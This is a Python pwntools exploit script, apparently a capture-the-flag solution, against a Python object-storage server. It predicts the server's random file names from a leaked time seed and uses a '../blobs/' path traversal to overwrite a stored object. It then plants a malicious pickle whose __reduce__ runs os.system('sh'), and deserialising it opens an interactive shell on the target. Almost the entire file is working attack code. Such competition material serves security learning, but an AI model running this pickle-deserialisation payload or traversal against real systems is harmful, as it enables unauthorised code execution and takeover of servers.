#!/usr/bin/env python3.8

import binascii
import pickle
import random

from pwn import *

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=x.x.x.x PORT=xxxxx
"""

HEX_CHARS = '0123456789abcdef'


class PickleCodeExec:
    def __reduce__(self):
        import os
        return (os.system, ('sh',),)


def rand_hex():
    """Copied from server.py."""
    return ''.join([
        random.choice(HEX_CHARS) for _ in range(32)
    ])


def init_pwntools_context():
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process('./server.py', stdin=pty, stdout=pty, stderr=pty)


def win(io):
    io.recvuntil(b'System time is ')
    seed = int(io.recvuntil('\n', drop=True))
    random.seed(a=seed)
    log.info(f'Mimicking target random seed of {seed}')

    object_file = rand_hex()
    predicted_blobs_file = rand_hex()

    log.info('Creating a pickled object whose data will be stored at:')
    log.info(f'objects/{object_file}')
    log.info('We are also forcing its symlinked key file to be written to:')
    log.info(f'blobs/{predicted_blobs_file}')
    log.info('This means that our next created file will instead overwrite '
             'the already-created object file!')

    pickle_payload = binascii.hexlify(
        pickle.dumps(PickleCodeExec())
    ).decode()
    log.info('We will use this primitive to write the following pickled '
             'payload:')
    log.info(pickle_payload)

    # XXX
    # io.interactive()

    corrupted_path = f'../blobs/{predicted_blobs_file}'
    io.sendlineafter('> ', f'store_object {corrupted_path} [1,2,3]'.encode())
    io.sendlineafter('> ', f'store_bytes dummy {pickle_payload}'.encode())

    log.info('Now, we can deserialize the overwritten pickled object!')

    io.sendlineafter('> ', f'retrieve_object {corrupted_path}'.encode())
    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)
